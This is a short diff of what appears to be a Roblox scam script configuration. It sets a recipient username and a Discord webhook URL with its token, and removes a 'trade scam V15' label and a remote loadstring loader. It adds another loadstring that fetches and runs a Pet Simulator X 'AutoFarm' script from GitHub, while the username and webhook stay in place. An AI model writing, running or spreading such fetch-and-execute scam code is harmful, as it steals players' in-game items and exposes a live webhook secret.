@@ -1,7 +1,3 @@
 _G.UserName = "xex23a"
-
 _G.Webhook = "https://discord.com/api/webhooks/1101218523474300948/y6U_jC7r4_oi5zgjVHWPLG9ChCdIbAiyM1Qvn3li8Ve2KLGsy8-o9VgmHXrilK-qHBdr"
-
-_G.loadingScreenText = "trade scam V15" 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
